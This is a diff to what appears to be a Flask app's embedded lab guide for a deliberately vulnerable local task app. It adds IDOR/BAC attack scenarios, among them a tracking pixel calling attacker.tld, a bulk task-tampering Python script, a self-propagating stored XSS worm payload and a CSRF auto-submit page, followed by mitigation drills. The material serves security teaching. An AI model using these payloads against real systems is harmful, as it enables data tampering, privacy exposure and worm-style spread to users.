@@ -293,6 +293,26 @@ curl -i -b &#x27;session=&lt;YOUR_FLASK_SESSION_COOKIE&gt;&#x27; \
 <li>You can modify, toggle, or delete tasks **you don’t own**. That’s an **IDOR/BAC** flaw.</li>
 </ul>
 
+<h3 class='text-xl font-semibold mt-4 mb-2'>Additional BAC / IDOR scenarios to try</h3>
+
+<ol class="list-decimal ml-6 space-y-1">
+<li>Mark a victim’s task as done/undone repeatedly via `/toggle/&lt;id&gt;` to disrupt their workflow.</li>
+<li>Overwrite the task title with attacker-controlled HTML (e.g., `&lt;img src=x onerror=...&gt;`) via `/edit/&lt;id&gt;` to weaponize stored XSS in someone else’s account.</li>
+<li>Set the `public` checkbox when editing a victim task to expose previously private notes on the `/feed` page.</li>
+<li>Clear the `public` checkbox on a collaborator’s public task to silently hide it from the feed.</li>
+<li>Append instructions like “Send password to …” into another user’s task title to phish them when they next log in.</li>
+<li>Iterate through IDs and delete every task you find, demonstrating how destructive a simple IDOR script can be.</li>
+<li>Flip the same task repeatedly to generate misleading activity patterns a blue team would struggle to trust.</li>
+<li>Edit a victim’s task to include tracking pixels (e.g., `&lt;img src="https://attacker.tld/pixel"&gt;`) and monitor when they open their list.</li>
+<li>Change multiple victim tasks to include unique IDs so you can map which task IDs belong to which victims as they revert the edits.</li>
+<li>Use `/edit/&lt;id&gt;` to add markdown-looking text that tricks the victim into following attacker-supplied “instructions”.</li>
+<li>Combine delete and edit IDORs: first edit a victim task to warn them, then immediately delete it to show race-condition style tampering.</li>
+<li>Force a victim’s “done” tasks back to incomplete status so their dashboard always looks unfinished.</li>
+<li>Rename tasks with profanity or defacements to demonstrate reputational risk from unauthorized edits.</li>
+<li>Modify someone’s task to embed an `&lt;iframe&gt;` pointing to a malicious site that loads whenever they view their list.</li>
+<li>Script an attack that toggles every discovered task ID once per minute, creating chaos across all users simultaneously.</li>
+</ol>
+
 <p>---</p>
 
 <h2 class='text-2xl font-bold mt-6 mb-3'>3) CSRF on Add, Edit, Toggle, Delete</h2>
@@ -406,7 +426,133 @@ curl -i -b &#x27;session=&lt;YOUR_FLASK_SESSION_COOKIE&gt;&#x27; \
 <li>[ ] Demonstrate clickjacking PoC.</li>
 </ul>
 
-<blockquote class='border-l-4 pl-4 italic text-slate-600'>That’s it. Keep your tests scoped to your own local RatTasks instance.</blockquote>"""
+<blockquote class='border-l-4 pl-4 italic text-slate-600'>That’s it. Keep your tests scoped to your own local RatTasks instance.</blockquote>
+
+<p>---</p>
+
+<h2 class='text-2xl font-bold mt-6 mb-3'>8) IDOR: Force Victim Tasks Public</h2>
+
+<p><strong>Goal:</strong> Use the existing edit IDOR to flip another user’s private task into the public feed.</p>
+
+<h3 class='text-xl font-semibold mt-4 mb-2'>Steps</h3>
+
+<ol class="list-decimal ml-6 space-y-1">
+<li>Enumerate a task ID owned by another user (see Module 2 for techniques).</li>
+<li>Visit <code>http://127.0.0.1:5000/edit/&lt;victim_id&gt;</code> while logged in as yourself.</li>
+<li>Check the <strong>Public</strong> box, keep or change the title, and click <strong>Save</strong>.</li>
+<li>Open <code>/feed</code> in a separate tab or browser profile.</li>
+</ol>
+
+<h3 class='text-xl font-semibold mt-4 mb-2'>Result</h3>
+
+<ul class="list-disc ml-6">
+<li>The victim’s task now appears on the public feed, even though they never opted in. This demonstrates a <strong>privacy impact</strong> from the IDOR.</li>
+</ul>
+
+<p>---</p>
+
+<h2 class='text-2xl font-bold mt-6 mb-3'>9) IDOR: Bulk Tampering Script</h2>
+
+<p><strong>Goal:</strong> Automate BAC exploitation to show how little effort it takes to destroy data at scale.</p>
+
+<h3 class='text-xl font-semibold mt-4 mb-2'>Proof-of-concept script (Python + <code>requests</code>)</h3>
+
+<pre class="bg-slate-100 p-4 rounded overflow-x-auto"><code>import requests
+
+BASE = &quot;http://127.0.0.1:5000&quot;
+COOKIE = {&quot;session&quot;: &quot;&lt;paste_your_cookie_here&gt;&quot;}
+
+for task_id in range(1, 101):
+    r = requests.post(
+        f&quot;{BASE}/edit/{task_id}&quot;,
+        data={&quot;title&quot;: f&quot;Owned #{task_id}&quot;, &quot;public&quot;: &quot;on&quot;},
+        cookies=COOKIE,
+        allow_redirects=False,
+    )
+    if r.status_code == 302:
+        print(f&quot;Edited task {task_id}&quot;)</code></pre>
+
+<h3 class='text-xl font-semibold mt-4 mb-2'>Result</h3>
+
+<ul class="list-disc ml-6">
+<li>In seconds you can mass-edit titles and flip tasks public, illustrating how dangerous an unprotected IDOR can be once scripted.</li>
+</ul>
+
+<p>---</p>
+
+<h2 class='text-2xl font-bold mt-6 mb-3'>10) Stored XSS Worm via Public Feed</h2>
+
+<p><strong>Goal:</strong> Chain the stored XSS with BAC so any victim who views the feed unknowingly propagates the payload.</p>
+
+<h3 class='text-xl font-semibold mt-4 mb-2'>Steps</h3>
+
+<ol class="list-decimal ml-6 space-y-1">
+<li>Use Module 8 to make a victim task public.</li>
+<li>Edit that task and replace the title with:</li>
+</ol>
+
+<pre class="bg-slate-100 p-4 rounded overflow-x-auto"><code>&lt;script&gt;
+fetch(&#x27;/edit/42&#x27;, {
+  method: &#x27;POST&#x27;,
+  headers: {&#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;},
+  body: &#x27;title=&#x27; + encodeURIComponent(&#x27;Worm!&#x27;) + &#x27;&amp;public=on&#x27;
+});
+fetch(&#x27;/&#x27;, {
+  method: &#x27;POST&#x27;,
+  headers: {&#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;},
+  body: &#x27;title=Worm+propagation&amp;public=on&#x27;
+});
+&lt;/script&gt;</code></pre>
+
+<p>3. View <code>/feed</code> in another browser. The script runs for any logged-in viewer, adding more worm tasks. Replace <code>42</code> with the victim task ID you discovered.</p>
+
+<h3 class='text-xl font-semibold mt-4 mb-2'>Result</h3>
+
+<ul class="list-disc ml-6">
+<li>A single malicious edit can spread automatically, showcasing combined impact of stored XSS + BAC.</li>
+</ul>
+
+<p>---</p>
+
+<h2 class='text-2xl font-bold mt-6 mb-3'>11) CSRF + IDOR Chain</h2>
+
+<p><strong>Goal:</strong> Build an external page that tricks an authenticated victim into editing someone else’s task on your behalf.</p>
+
+<h3 class='text-xl font-semibold mt-4 mb-2'>Steps</h3>
+
+<ol class="list-decimal ml-6 space-y-1">
+<li>Identify a target task ID (e.g., <code>37</code>).</li>
+<li>Create a file <code>csrf-idor.html</code> with:</li>
+</ol>
+
+<pre class="bg-slate-100 p-4 rounded overflow-x-auto"><code>&lt;!doctype html&gt;
+&lt;form action=&quot;http://127.0.0.1:5000/edit/37&quot; method=&quot;POST&quot; id=&quot;steal&quot;&gt;
+  &lt;input name=&quot;title&quot; value=&quot;CSRF defacement&quot;&gt;
+  &lt;input name=&quot;public&quot; value=&quot;on&quot;&gt;
+&lt;/form&gt;
+&lt;script&gt;steal.submit();&lt;/script&gt;</code></pre>
+
+<p>3. Send the link to a logged-in victim. When they open it, their browser submits the form.</p>
+
+<h3 class='text-xl font-semibold mt-4 mb-2'>Result</h3>
+
+<ul class="list-disc ml-6">
+<li>The victim unknowingly edits another user’s task. This demonstrates how CSRF multiplies the blast radius of the existing IDOR.</li>
+</ul>
+
+<p>---</p>
+
+<h2 class='text-2xl font-bold mt-6 mb-3'>12) Blue Team Mitigation Drills</h2>
+
+<p>Use these scenarios to practice defending the app after demonstrating the exploits:</p>
+
+<ul class="list-disc ml-6">
+<li>Add ownership checks (<code>WHERE id = ? AND user_id = ?</code>) on every task mutation.</li>
+<li>Log suspicious patterns like dozens of edits from a single IP in seconds.</li>
+<li>Add CSRF tokens and require POST/DELETE for destructive actions.</li>
+<li>Sanitize or escape task titles before rendering; remove <code>|safe</code> entirely.</li>
+<li>Require re-authentication before enabling the <strong>Public</strong> flag to avoid silent privacy flips.</li>
+</ul>"""
 
 # ------------------------ Routes: Auth ------------------------
 
